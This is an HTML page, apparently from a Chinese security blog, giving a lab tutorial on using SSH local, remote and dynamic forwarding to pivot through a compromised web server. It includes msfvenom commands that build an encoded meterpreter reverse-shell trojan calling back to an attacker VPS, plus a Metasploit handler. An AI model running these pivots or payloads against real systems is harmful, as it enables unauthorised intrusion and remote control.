@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>SSH隧道技术研究和实战 - F0rmat的博客-专注于网络安全、信息安全、内网渗透、红队攻防</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="F0rmat" />
+  <meta name="description" content="0x00 简介 在内网中，几乎所有的Linux服务器都 支持SSH协议，一般情况下SSH的端口协议是允许通过防火墙的，所以会经常被攻击利用。而且，SSH" />
+
+  <meta name="keywords" content="渗透测试, 网络安全, F0rmat" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.2" />
+
+
+<link rel="canonical" href="https://xxe.icu/post/ssh_tunnel/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.5227954e5327390ee2be2e9ddae8b96f1ada64bdf87e87b56b029198ec14dcde.css" integrity="sha256-UieVTlMnOQ7ivi6d2ui5bxraZL34foe1awKRmOwU3N4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="SSH隧道技术研究和实战" />
+<meta property="og:description" content="0x00 简介 在内网中，几乎所有的Linux服务器都 支持SSH协议，一般情况下SSH的端口协议是允许通过防火墙的，所以会经常被攻击利用。而且，SSH" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxe.icu/post/ssh_tunnel/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-10T11:04:34+08:00" />
+<meta property="article:modified_time" content="2022-02-10T11:04:34+08:00" />
+
+<meta itemprop="name" content="SSH隧道技术研究和实战">
+<meta itemprop="description" content="0x00 简介 在内网中，几乎所有的Linux服务器都 支持SSH协议，一般情况下SSH的端口协议是允许通过防火墙的，所以会经常被攻击利用。而且，SSH"><meta itemprop="datePublished" content="2022-02-10T11:04:34+08:00" />
+<meta itemprop="dateModified" content="2022-02-10T11:04:34+08:00" />
+<meta itemprop="wordCount" content="3355">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SSH隧道技术研究和实战"/>
+<meta name="twitter:description" content="0x00 简介 在内网中，几乎所有的Linux服务器都 支持SSH协议，一般情况下SSH的端口协议是允许通过防火墙的，所以会经常被攻击利用。而且，SSH"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">F0rmat's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      F0rmat's Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">SSH隧道技术研究和实战</h1>
+      
+      <div class="post-meta">
+        <time datetime="2022-02-10" class="post-time">
+          2022-02-10
+        </time>
+        
+        <span class="more-meta"> 约 3355 字 </span>
+          <span class="more-meta"> 预计阅读 7 分钟 </span>
+
+        
+        
+          <span id="busuanzi_container_page_pv">
+            | 阅读 <span id="busuanzi_value_page_pv"></span>
+          </span>
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x00-简介">0x00 简介</a></li>
+        <li><a href="#0x01-基础操作">0x01 基础操作</a>
+          <ul>
+            <li><a href="#1本地转发">1、本地转发</a></li>
+            <li><a href="#2远程转发">2、远程转发</a></li>
+            <li><a href="#3动态转发">3、动态转发</a></li>
+            <li><a href="#4x协议转发">4、X协议转发</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x02-实战">0x02 实战</a></li>
+        <li><a href="#0x03-防御ssh隧道攻击">0x03 防御SSH隧道攻击</a></li>
+        <li><a href="#0x04-参考">0x04 参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h2 id="0x00-简介">0x00 简介</h2>
+<p>在内网中，几乎所有的Linux服务器都 支持SSH协议，一般情况下SSH的端口协议是允许通过防火墙的，所以会经常被攻击利用。而且，SSH协议的传输过程是加密的，所以我们很难在流量分析中区别是否是被攻击者利用，攻击者使用SSH协议作为隧道突破防火墙后，可以建立一些TCP连接进行操作。</p>
+<h2 id="0x01-基础操作">0x01 基础操作</h2>
+<p>转发需要知道的参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">-C：压缩传输，提高传输速度
+-f ：将ssh传输转入后台执行，不占用当前的shell
+-N：建立静默连接（建立了连接，但是看不到具体的会话）
+-g 允许远程主机连接本地用于转发的端口。
+-L：本地端口转发
+-R：远程端口转发
+-D：动态转发（socks代理）
+-P：指定ssh端口
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="1本地转发">1、本地转发</h3>
+<p>如下图所示，左侧为攻击者的VPS，中间是一台防火墙，右侧则是一个小型的内网；外部的VPS能访问内网的Web服务器，但不能访问数据库服务器，数据库和Web服务器能互相访问。</p>
+<p>我们要做的目标是：<strong>以Web服务器作为跳板，访问内网中数据库服务器的3389端口。</strong></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png" alt="1"></p>
+<p>我们只需要把数据库服务器172.16.0.106的3389端口映射到VPS上的1152端口，再访问VPS的1152端口就可以访问数据库服务器的3389端口了。</p>
+<p>我们在VPS上执行下面命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ssh -CfNg -L 1152(VPS端口):172.16.0.106(数据库服务器IP):3389(数据库服务器端口) web@172.16.0.108(Web服务器)
+</code></pre></td></tr></table>
+</div>
+</div><p>执行后输入密码即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ ssh -CfNg -L 1152:172.16.0.106:3389 web@172.16.0.108                                                                                                                                                                             
+kali@172.16.0.108<span class="err">&#39;</span>s password: 
+</code></pre></td></tr></table>
+</div>
+</div><p>我们可以在VPS查看下监听的端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ netstat -tunlp                                                                                                                                                                                                                    
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:1152            0.0.0.0:*               LISTEN      935867/ssh          
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::1152                 :::*                    LISTEN      935867/ssh          
+</code></pre></td></tr></table>
+</div>
+</div><p>然后我们在VPS下可以用remmina进行远程桌面连接<code>127.0.0.1:1152</code>，可以看到我们已经可以访问数据库服务器的远程桌面：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/2.png" alt="2"></p>
+<p>整个过程就是我们在本地访问1152端口，就是通过ssh协议将数据传输到远程端口3389，我们可以看到是从web服务器(172.16.0.108)的IP进行登录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">C:\Users\test\Desktop&gt;netstat -ano | findstr &#34;3389&#34;
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1000
+  TCP    172.16.0.106:3389      172.16.0.108:57100     ESTABLISHED     1000
+  TCP    [::]:3389              [::]:0                 LISTENING       1000
+  UDP    0.0.0.0:3389           *:*                                    1000
+  UDP    [::]:3389              *:*                                    1000
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="2远程转发">2、远程转发</h3>
+<p>如下图所示，左侧为攻击者的VPS，中间是一台防火墙，右侧则是一个小型的内网；外部的VPS不能访问内网的Web服务器和数据库服务器，数据库和Web服务器能互相访问，<strong>但Web服务器可以访问VPS</strong>。</p>
+<p>我们要做的目标是：<strong>以Web服务器作为跳板，访问内网中数据库服务器的3389端口。</strong></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png" alt="1"></p>
+<p>一样是以Web服务器作为跳板，通过访问VPS的1152端口将数据传输到数据库服务器的3389端口，与上面不同的是执行命令的是在Web服务器。</p>
+<p>VPS不用操作，我们只在Web服务器执行以下命令，输入vps的密码即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -CfNg -R 1152<span class="o">(</span>VPS端口<span class="o">)</span>:172.16.0.106<span class="o">(</span>数据库服务器IP<span class="o">)</span>:3389<span class="o">(</span>数据库服务器端口<span class="o">)</span> kali@172.16.0.107<span class="o">(</span>VPS<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们在VPS服务器查看端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ netstat -tunlp                                                                                                                                                                                                               
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:1152            0.0.0.0:*               LISTEN      935867/ssh          
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::1152                 :::*                    LISTEN      935867/ssh      
+</code></pre></td></tr></table>
+</div>
+</div><p>然后我们在VPS下可以用remmina进行远程桌面连接<code>127.0.0.1:1152</code>就可以连接到数据库服务器的3389端口了。</p>
+<h3 id="3动态转发">3、动态转发</h3>
+<p>如下图所示，左侧为攻击者的VPS，中间是一台防火墙，右侧则是一个小型的内网；外部的VPS能访问内网的Web服务器，但不能访问数据库服务器，数据库和Web服务器能互相访问。</p>
+<p>我们要做的目标是：<strong>以Web服务器作为跳板建立socks代理，访问内网中服务器</strong></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png" alt="1"></p>
+<p>实践上就是建立SOCKS 4/5的代理通道，我们在VPS上输入下面命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -CfNg -D 8811<span class="o">(</span>VPS端口<span class="o">)</span> web@172.16.0.108<span class="o">(</span>Web服务器<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们在VPS服务器查看端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ netstat -tunlp                                                                                                                                                                                                               
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8811            0.0.0.0:*               LISTEN      935868/ssh          
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::8811                :::*                    LISTEN      935868/ssh      
+</code></pre></td></tr></table>
+</div>
+</div><p>然后我们可以使用kali自带的<strong>proxychains</strong>，我们只需要编辑一下配置文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ sudo vim /etc/proxychains4.conf 
+</code></pre></td></tr></table>
+</div>
+</div><p>在最后一行加入内容<code>socks4  127.0.0.1 8811</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &#34;tor&#34;
+socks4  127.0.0.1 8811
+</code></pre></td></tr></table>
+</div>
+</div><p>保存后，我们使用下面命令即可访问到数据库服务器的3389端口：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>VPS㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ proxychains4 remmina         
+</code></pre></td></tr></table>
+</div>
+</div><p>直接输入数据库服务器IP即可连接：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/3.png" alt="3"></p>
+<p>当然也可以使用nmap、hydra等工具对内网进行扫描，只需要在前面加上proxychains4即可。</p>
+<h3 id="4x协议转发">4、X协议转发</h3>
+<p>远程登陆 Linux GUI 运行图形化界面工具，类似于VNC和X windows。</p>
+<p>如下图所示，左侧为攻击者的VPS，中间是一台防火墙，右侧则是一个小型的内网；外部的VPS能访问内网的Web服务器，但不能访问数据库服务器，数据库和Web服务器能互相访问。</p>
+<p>我们要做的目标是：<strong>以Web服务器作为跳板建立隧道，访问内网中服务器</strong></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/1.png" alt="1"></p>
+<p>我们在VPS上输入下面命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -X web@172.16.0.108<span class="o">(</span>Web服务器<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以发现终端已经变成了web服务器的终端界面，我们在当前的终端输入firefox、remmina就是打开web服务器上的软件，相当于VPS上实现图形化操作，查询端口两边都监听了6010端口：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/4.png" alt="4"></p>
+<blockquote>
+<p>图中的oscp是VPS，kali是Web服务器，106是数据库服务器</p>
+</blockquote>
+<h2 id="0x02-实战">0x02 实战</h2>
+<p>实验环境如图，下面的环境相当于我们拿到了web服务器的webshell，但是是内网机器，VPS不能直接访问到Web服务器，而且VPS上没有Msf，VPS也不能直接访问本地Kali Linux，但web服务器和本地Kali Linux可以访问到VPS，这个时候要用到Msf我们需要使用SSH协议进行端口转发，当然也可以用reGeog来做代理。</p>
+<p>我们要做的目标是：<strong>利用VPS作为中转，本地Kali Linux利用Msf控制内网中的Web服务器</strong></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ssh_tunnel/5.png" alt="5"></p>
+<p>在公网的VPS需要修改一下ssh的配置文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo vim /etc/ssh/sshd_config
+</code></pre></td></tr></table>
+</div>
+</div><p>把以下三项开启并修改为yes：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> AllowTcpForwarding yes
+ GatewayPorts yes
+ TCPKeepAlive yes
+</code></pre></td></tr></table>
+</div>
+</div><p>先在本地的Kali Linux上进行启动Msf监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/multi/handler
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp_rc4_dns 
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">53</span>
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 172.16.0.107
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options
+Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp_rc4_dns<span class="o">)</span>:
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   EXITFUNC     process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST        172.16.0.107     yes       The DNS hostname to connect back to
+   LPORT        <span class="m">53</span>               yes       The listen port
+   RC4PASSWORD  msf              yes       Password to derive RC4 key from
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="m">0</span>   Wildcard Target
+
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+
+</code></pre></td></tr></table>
+</div>
+</div><p>使用msfvenom生成一个木马,lhost填写VPS的IP：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">msfvenom --platform Windows -p windows/meterpreter/reverse_tcp_rc4_dns lhost=172.16.0.108 lport=443 rc4password=msf -e x86/shikata_ga_nai -b &#39;\x00&#39; -i 5 -f exe -o dns_rc4.exe
+</code></pre></td></tr></table>
+</div>
+</div><p>下一步就在本地Kali Linux上执行ssh转发：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">┌──(Kali㉿Kali)-[~]
+└─$ ssh -C -f -N -g -R 443(VPS端口):172.16.0.107(本地Kali):53(Kali监听端口) VPS@172.16.0.108 
+</code></pre></td></tr></table>
+</div>
+</div><p>然后查看本地Kali的端口状态：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$ netstat -tunlp                                                                                                                                                                                                               
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        <span class="m">0</span>      <span class="m">0</span> 172.16.0.107:53         0.0.0.0:*               LISTEN      - 
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      - 
+</code></pre></td></tr></table>
+</div>
+</div><p>查看VPS的端口状态：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">──(vps㉿vps)-[~]
+└─$ netstat -tunlp                                                                                                                                                                                                               
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                     
+tcp        0      0 0 0.0.0.0:443           0.0.0.0:*               LISTEN      - 
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
